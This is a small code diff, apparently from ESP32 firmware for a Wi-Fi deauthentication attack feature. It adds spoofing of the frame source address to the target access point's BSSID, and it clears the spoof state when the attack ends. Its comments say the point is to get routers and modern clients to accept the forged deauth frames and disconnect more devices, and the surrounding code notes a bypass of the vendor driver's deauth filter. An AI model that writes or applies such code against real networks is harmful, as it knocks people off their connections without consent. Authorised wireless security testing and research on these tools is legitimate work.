@@ -222,6 +222,12 @@ void feat_wifi_deauth(void)
         if (!pmf_warning()) return;
     }
 
+    /* Spoof addr2 = target BSSID so our deauth frames land with the
+     * correct 802.11 source address. Routers + modern clients drop
+     * frames whose addr2 doesn't match the BSSID field (addr3), so
+     * leaving this at our own MAC means fewer kicks across the board. */
+    wifi_silent_ap_set_source_mac(s_target);
+
     /* Marauder-style silent AP mode — only setup that bypasses the blob's
      * deauth-subtype filter on stock ESP-IDF. */
     esp_err_t ap_rc = wifi_silent_ap_begin(s_channel);
@@ -301,4 +307,5 @@ void feat_wifi_deauth(void)
     uint32_t deadline = millis() + 500;
     while (s_deauth_task_alive && millis() < deadline) delay(5);
     wifi_silent_ap_end();
+    wifi_silent_ap_set_source_mac(nullptr);   /* clear spoof state */
 }
